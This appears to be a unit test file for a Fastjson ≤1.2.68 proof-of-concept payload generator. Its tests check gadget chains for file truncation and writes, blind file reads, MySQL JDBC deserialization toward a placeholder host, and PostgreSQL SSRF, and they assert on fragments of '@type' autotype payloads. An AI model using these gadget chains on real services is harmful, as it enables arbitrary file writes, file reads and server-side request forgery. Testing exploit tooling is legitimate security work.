"""Fastjson ≤1.2.68 payload 生成单测（不打真实目标）。"""

from __future__ import annotations

from fastjson_toolkit.poc import Poc1268GenerateOptions
from fastjson_toolkit.poc.v1_2_68.payloads import (
    build_file_truncate,
    build_io1_write,
    build_io_final,
    build_jdk11_write,
    build_mysql_jdbc_51,
    build_payload,
)
from fastjson_toolkit.poc.v1_2_68.service import generate_poc_1268, list_gadgets


def test_list_gadgets_covers_notes():
    ids = {g["id"] for g in list_gadgets()}
    assert "io_final" in ids
    assert "io_read_error" in ids
    # io1–io5 写变体默认隐藏
    assert "io1_write" not in ids
    assert "io5_write" not in ids
    all_ids = {g["id"] for g in list_gadgets(include_hidden=True)}
    assert all_ids >= {
        "file_truncate",
        "jdk11_write",
        "file_copy",
        "io1_write",
        "io2_write",
        "io3_write",
        "io4_write",
        "io5_write",
        "io_final",
        "io_read_error",
        "mysql_jdbc_51",
        "mysql_jdbc_80",
        "postgresql_ssrf",
    }
    hidden_writes = {
        g["id"]
        for g in list_gadgets(include_hidden=True)
        if g["id"] in {"io1_write", "io2_write", "io3_write", "io4_write", "io5_write"}
    }
    assert hidden_writes == {"io1_write", "io2_write", "io3_write", "io4_write", "io5_write"}
    assert all(
        g["hidden"]
        for g in list_gadgets(include_hidden=True)
        if g["id"] in hidden_writes
    )
    assert not next(g for g in list_gadgets() if g["id"] == "io_final")["hidden"]


def test_file_truncate_has_duplicate_autocloseable():
    p = build_file_truncate("/tmp/x")
    assert p.count('"@type":"java.lang.AutoCloseable"') == 1
    assert '"@type":"java.io.FileOutputStream"' in p
    assert p.index("AutoCloseable") < p.index("FileOutputStream")


def test_jdk11_write_has_inflater_array():
    p = build_jdk11_write("/tmp/x", "hello")
    assert "MarshalOutputStream" in p
    assert "InflaterOutputStream" in p
    assert '"array":' in p
    assert '"limit":' in p


def test_io1_typed_string_quirk():
    p = build_io1_write("/tmp/pwned", "aaaaaa")
    assert '{"@type":"java.lang.String""aaaaaa"' in p
    assert "BOMInputStream" in p
    assert "LazyFileOutputStream" in p
    assert '"$ref":"$.bOM"' in p


def test_io_final_bom_ref():
    p = build_io_final("/tmp/out", "AB")
    assert "BOMInputStream" in p
    assert '"$ref":"$.bOM"' in p
    assert "LazyFileOutputStream" in p


def test_mysql51_shape():
    p = build_mysql_jdbc_51("1.2.3.4", 3308, "u")
    assert "JDBC4Connection" in p
    assert "ServerStatusDiffInterceptor" in p
    assert "1.2.3.4" in p


def test_io_read_error_multi_bytes():
    p = build_payload(
        "io_read_error",
        url="file:///tmp/x",
        bom_bytes=[70, 74, 49],
    )
    assert '"bytes":[70,74,49]' in p
    assert "CharSequenceReader" in p
    assert "URLReader" in p


def test_io_read_charset_presets():
    from fastjson_toolkit.poc.v1_2_68.io_read import (
        ASCII_LINUX_MIXED,
        is_error_read_match,
        resolve_read_charset,
    )

    assert resolve_read_charset("mixed") == ASCII_LINUX_MIXED
    assert 70 in resolve_read_charset("mixed")
    assert 65 not in resolve_read_charset("lower")
    assert is_error_read_match(400, "x") is True
    assert is_error_read_match(200, "nope") is False
    assert is_error_read_match(200, '{"abc":{"bOM":{}}}') is True
    assert is_error_read_match(200, "charSequence boom") is True


def test_generate_service():
    r = generate_poc_1268(Poc1268GenerateOptions(gadget="file_truncate", file="/tmp/t"))
    assert r.ok
    assert "FileOutputStream" in r.payload
    assert build_payload("io2_write", file="/tmp/a", content="x")


def test_wrap_currency_on_1268():
    r = generate_poc_1268(
        Poc1268GenerateOptions(
            gadget="io1_write",
            file="/tmp/a",
            content="aaaaaa",
            wrap_currency=True,
        )
    )
    assert r.wrap_currency is True
    assert "java.util.Currency" in r.payload
    assert '"$ref":"$.bOM"' in r.payload
